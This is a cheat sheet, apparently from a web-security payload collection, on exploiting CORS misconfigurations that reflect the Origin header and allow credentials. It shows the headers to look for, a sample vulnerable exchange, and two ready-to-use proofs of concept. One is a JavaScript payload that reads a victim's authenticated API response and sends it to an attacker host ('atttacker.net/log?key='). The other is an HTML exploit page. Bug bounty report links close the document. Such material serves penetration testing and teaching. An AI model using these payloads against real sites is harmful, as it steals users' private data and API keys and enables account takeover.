# CORS Misconfiguration

> A site-wide CORS misconfiguration was in place for an API domain. This allowed an attacker to make cross origin requests on behalf of the user as the application did not whitelist the Origin header and had Access-Control-Allow-Credentials: true meaning we could make requests from our attacker’s site using the victim’s credentials. 

## Summary

* [Prerequisites](#prerequisites)
* [Exploitation](#exploitation)
* [References](#references)

## Prerequisites

* BURP HEADER> `Origin: https://evil.com`
* VICTIM HEADER> `Access-Control-Allow-Credential: true`
* VICTIM HEADER> `Access-Control-Allow-Origin: https://evil.com`

## Exploitation

Usually you want to target an API endpoint. Use the following payload to exploit a CORS misconfiguration on target **https://victim.example.com/endpoint**.

### Vulnerable example 

```powershell
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: https://evil.com
Cookie: sessionid=... 

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

### Proof of concept

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://victim.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//atttacker.net/log?key='+this.responseText; 
};
```

or 

```html
<html>
     <body>
         <h2>CORS PoC</h2>
         <div id="demo">
             <button type="button" onclick="cors()">Exploit</button>
         </div>
         <script>
             function cors() {
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
                 if (this.readyState == 4 && this.status == 200) {
                 document.getElementById("demo").innerHTML = alert(this.responseText);
                 }
             };
              xhr.open("GET",
                       "https://victim.example.com/endpoint", true);
             xhr.withCredentials = true;
             xhr.send();
             }
         </script>
     </body>
 </html>
```

## Bug Bounty reports

* [CORS Misconfiguration on www.zomato.com - James Kettle (albinowax)](https://hackerone.com/reports/168574)
* [CORS misconfig | Account Takeover - niche.co - Rohan (nahoragg)](https://hackerone.com/reports/426147)
* [Cross-origin resource sharing misconfig | steal user information - bughunterboy (bughunterboy)](https://hackerone.com/reports/235200)
* [CORS Misconfiguration leading to Private Information Disclosure - sandh0t (sandh0t)](https://hackerone.com/reports/430249)
* [[██████] Cross-origin resource sharing misconfiguration (CORS) - Vadim (jarvis7)](https://hackerone.com/reports/470298)

## References

* [Think Outside the Scope: Advanced CORS Exploitation Techniques - @Sandh0t - May 14 2019](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)
* [Exploiting CORS misconfigurations for Bitcoins and bounties - James Kettle | 14 October 2016](https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
* [Exploiting Misconfigured CORS (Cross Origin Resource Sharing) - Geekboy - DECEMBER 16, 2016](https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/)
* [Advanced CORS Exploitation Techniques - Corben Leo - June 16, 2018](https://www.corben.io/advanced-cors-techniques/)